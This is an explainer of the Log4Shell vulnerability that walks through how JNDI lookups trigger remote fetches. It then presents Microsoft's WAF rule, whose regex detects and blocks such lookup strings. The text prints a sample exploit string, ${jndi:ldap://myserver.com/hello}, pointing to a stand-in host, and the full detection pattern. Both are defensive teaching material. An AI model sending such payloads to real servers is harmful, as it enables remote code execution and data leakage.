# Explainer: Log4Shell and creation of a custom rule

When the log4shell exploit came out in the fall of 2021, there was no immediate mitigation available in WAF available.  Creating a custom rule to protect against the 0day vulnerability was what was required.

Some weeks later, the Azure WAF Product Team created custom rule to provide protection against this.

## Payload

A good explainer can be found [here](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/).  At its core, JNDI "Java Naming and Directory Interface" is a way of fetching data from a remote resource and deserializing it into Java objects, which can contain executable code.

The vulnerability is similar to so many of the others we've talked about:  Poor input validation.  Just like with SQL Injections.  

The vulnerability here is that the log4j open source library uses a feature called "lookups" which are specially structured strings, which can log environment-specific data.
The log4j library didn't disallow certain types of lookups, and so allowed the full range of JNDI lookups, which include grabbing data from a remote server, and potentially executing it.  Essentially, a specially structured string can cause your application server to grab content from a remote server, and potentially do something with it.  This can be either something like downloading malware, or leaking system data by embedding it in HTTP requests which are logged on the target malicious server.

Basically, sample payloads are formatted like below using the syntax for JNDI lookups

${jndi:ldap://myserver.com/hello}

If this string appears *anywhere* which ends up getting logged with the log4j library, it'll cause the server to call out to myserver.com and the /hello application, download the content and de-serialize into an in-memory object.

## Rule Code

The rule code produced is below by Microsoft's WAF developers:

```
SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@* \
    "@rx (\$\{jndi\:(?:ldap|ldaps|dns|rmi|nis|nds|corba|iiop)\:\/\/|\$\{[jndilap:]*\$\{(?:lower:|upper:|date:|env:\w*:-|sys:\w*:-|::-)[jndilap:]*\})" \
    "id:800100,\
    phase:2,\
    block,\
    t:none,t:lowercase,\
    log,\
    msg:'Remote Command Execution: Log4j CVE-2021-44228',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-java',\
    tag:'platform-multi',\
    tag:'attack-rce',\
    tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',\
    tag:'WASCTC/WASC-31',\
    tag:'OWASP_TOP_10/A1',\
    tag:'PCI/6.5.2',\
    tag:'paranoia-level/2',\
    ver:'OWASP_CRS/3.2.0',\
    severity:'CRITICAL',\
    setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
```

We can see a few things:

`ARGS|ARGS_NAMES|REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*`

- Targets all of the arguments (uri, cookie, forms, etc.), request body, cookies, cookies which aren't "utm" cookies ([explainer here](https://www.morevisibility.com/blogs/analytics/from-utma-to-utmz-google-analytics-cookies.html)), and any XML elements.

`(\$\{jndi\:(?:ldap|ldaps|dns|rmi|nis|nds|corba|iiop)\:\/\/|\$\{[jndilap:]*\$\{(?:lower:|upper:|date:|env:\w*:-|sys:\w*:-|::-)[jndilap:]*\})`

This regex first looks for the JDNI resource prefixes, "jndi" or "jndilap", then checks to see if one of the resource types is used for those, which are protocols (ldap, dns, rmi, etc.) which can trigger remote requests or functions (lower, upper, env) which can leak data by embedding it into a remote call.

https://regexper.com/#%28%5C%24%5C%7Bjndi%5C%3A%28%3F%3Aldap%7Cldaps%7Cdns%7Crmi%7Cnis%7Cnds%7Ccorba%7Ciiop%29%5C%3A%5C%2F%5C%2F%7C%5C%24%5C%7B%5Bjndilap%3A%5D*%5C%24%5C%7B%28%3F%3Alower%3A%7Cupper%3A%7Cdate%3A%7Cenv%3A%5Cw*%3A-%7Csys%3A%5Cw*%3A-%7C%3A%3A-%29%5Bjndilap%3A%5D*%5C%7D%29
